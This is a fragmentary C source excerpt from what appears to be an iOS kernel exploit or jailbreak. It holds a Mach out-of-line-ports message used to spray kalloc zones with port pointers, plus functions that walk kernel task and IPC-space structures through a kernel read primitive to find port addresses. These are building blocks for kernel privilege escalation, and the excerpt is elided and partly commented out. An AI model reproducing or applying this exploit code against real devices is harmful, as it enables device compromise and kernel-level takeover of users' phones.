...
struct ool_msg1 {
    mach_msg_header_t hdr1;
    mach_msg_body_t body1;
    mach_msg_ool_ports_descriptor_t ool_ports1;
};
...
static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)
{
    ...
    struct ool_msg1* msg = calloc(1, sizeof(struct ool_msg1));
    
    msg->hdr1.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr1.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg1);
    msg->hdr1.msgh_remote_port = q;
    msg->hdr1.msgh_local_port = MACH_PORT_NULL;
    msg->hdr1.msgh_id = 0x41414141;
    
    msg->body1.msgh_descriptor_count = 1;
    
    msg->ool_ports1.address = ports;
    msg->ool_ports1.count = count;
    msg->ool_ports1.deallocate = 0;
    msg->ool_ports1.disposition = disposition;
    msg->ool_ports1.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports1.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr1,
                   MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(struct ool_msg1),
                   0,
                   MACH_PORT_NULL,
...
uint64_t find_port_via_kmem_read(mach_port_name_t port)
{
    ...
    uint64_t task_port_addr = current_task_s3_s3;//find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);//
    
    uint64_t task_addr = current_task_s3_s3;//kernel_read64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    uint64_t itk_space = rk64SP(task_addr + OFFSET(task, itk_space));
    //uint64_t itk_space = itk_space_s3;//kernel_read64(task_addr + koffsetS3(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64SP(itk_space + OFFSET(ipc_space, is_table));
    //uint64_t is_table = itk_space_istable_s3;//kernel_read64(itk_space + koffsetS3(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
...
uint64_t find_port_via_kmem_read_not(mach_port_name_t port)
{
    ...
    uint64_t task_port_addr = self_port_addr_SP;// task_addr_SP;// cached_task_self_addr;//find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);//task_self_addr_cache;
    uint64_t task_addr = current_task_s3_s3;//ReadKernel64(task_port_addr + SPkoffset(SPKSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64SP(task_addr + OFFSET(task, itk_space));
    uint64_t is_table = rk64SP(itk_space + OFFSET(ipc_space, is_table_size));
